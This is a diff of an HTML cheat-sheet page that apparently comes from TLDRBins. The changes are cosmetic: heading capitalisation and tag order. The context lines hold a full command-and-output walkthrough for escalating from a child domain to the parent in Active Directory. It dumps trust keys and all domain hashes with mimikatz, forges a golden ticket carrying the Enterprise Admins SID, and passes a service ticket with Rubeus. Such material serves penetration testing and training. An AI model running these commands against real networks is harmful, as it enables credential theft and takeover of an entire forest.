@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <meta name="description" content="">
-<title>Abuse Parent Child Domain Trusts | TLDRBins</title>
+<title>Abuse Parent-Child Domain Trusts | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
 </head>
 <body>
@@ -14,7 +14,7 @@
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
     </a><span class="hl"> / </span>
-    <a href="https://tldrbins.github.io/abuse_parent_child_domain_trusts/"><span>Abuse Parent Child Domain Trusts</span></a></h1>
+    <a href="https://tldrbins.github.io/abuse_parent_child_domain_trusts/"><span>Abuse Parent-Child Domain Trusts</span></a></h1>
   <div class="theme-toggle-wrapper">
     <div class="theme-toggle">
       <div class="theme-toggle-track">
@@ -140,19 +140,18 @@
 </header>
 <main>
 <ul class="tagsList single">
-  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
-  <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
-  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
-  <li><a href="https://tldrbins.github.io/@domain-trust/">Domain Trust</a></li>
-  <li><a href="https://tldrbins.github.io/@golden-ticket/">Golden Ticket</a></li>
-  <li><a href="https://tldrbins.github.io/@silver-ticket/">Silver Ticket</a></li>
-  <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
-  <li><a href="https://tldrbins.github.io/@trust-relationship/">Trust Relationship</a></li>
-  <li><a href="https://tldrbins.github.io/@mimikatz/">Mimikatz</a></li>
-  <li><a href="https://tldrbins.github.io/@pass-the-hash/">Pass-the-Hash</a></li>
-  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
-  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  <li><a href="https://tldrbins.github.io/@privilege-escalation/">Privilege Escalation</a></li>
+  <li><a href="https://tldrbins.github.io/@domain-trusts/">Domain Trusts</a></li>
+  <li><a href="https://tldrbins.github.io/@parent-child-trust/">Parent-Child Trust</a></li>
+  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
+  <li><a href="https://tldrbins.github.io/@golden-ticket/">Golden Ticket</a></li>
+  <li><a href="https://tldrbins.github.io/@mimikatz/">Mimikatz</a></li>
+  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
+  <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
+  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
+  <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
+  <li><a href="https://tldrbins.github.io/@cross-domain-attack/">Cross-Domain Attack</a></li>
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
 </ul>
 <hr>
@@ -179,7 +178,7 @@
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trust-relationships">1. Check trust relationships</h4>
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trust-relationships">1. Check Trust Relationships</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get all trusted domain objects in a forest
 </span></span><span class="line"><span class="cl"><span class="go">Get-ADTrust -Filter *
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -228,7 +227,7 @@
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check forest trust
 </span></span><span class="line"><span class="cl"><span class="go">([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get current and target domain SID</h4>
+TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get Current and Target Domain SID</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "lsadump::trust" "exit"
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz.exe 'lsadump::trust' 'exit'
@@ -249,7 +248,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></div></pre></div><h4 id="3-get-krbtgt-hash">3. Get krbtgt hash</h4>
+</span></span></span></div></pre></div><h4 id="3-get-krbtgt-hash">3. Get krbtgt Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "lsadump::dcsync /all /csv" "exit"
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; .\mimikatz "lsadump::dcsync /all /csv" "exit"
@@ -274,7 +273,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></div></pre></div><h4 id="4-forge-a-golden-ticket">4. Forge a golden ticket</h4>
+</span></span></span></div></pre></div><h4 id="4-forge-a-golden-ticket">4. Forge a Golden Ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Append <span class="s1">'-519'</span> to target domain SID <span class="o">(</span>Enterprise Admins Group<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<span class="o editable-keyword">&lt;CURRENT_DOMAIN&gt;</span> /sid:<span class="o editable-keyword">&lt;CURRENT_DOMAIN_SID&gt;</span> /rc4:<span class="o editable-keyword">&lt;PARENT_HASH&gt;</span> /sids:<span class="o editable-keyword">&lt;TARGET_DOMAIN_SID&gt;</span>-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -309,7 +308,7 @@ TO-DO</div></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get curre
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></div></pre></div><p><small><em>Note: Try different high value hashes if failed</em></small></p>
-<h4 id="5-request-a-service-ticket-of-target-domain">5. Request a service ticket of target domain</h4>
+<h4 id="5-request-a-service-ticket-of-target-domain">5. Request a Service Ticket of Target Domain</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgs /service:cifs/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /dc:<span class="o editable-keyword">&lt;DC&gt;</span> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EXAMPLE.COM /dc:dc01.example.com /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
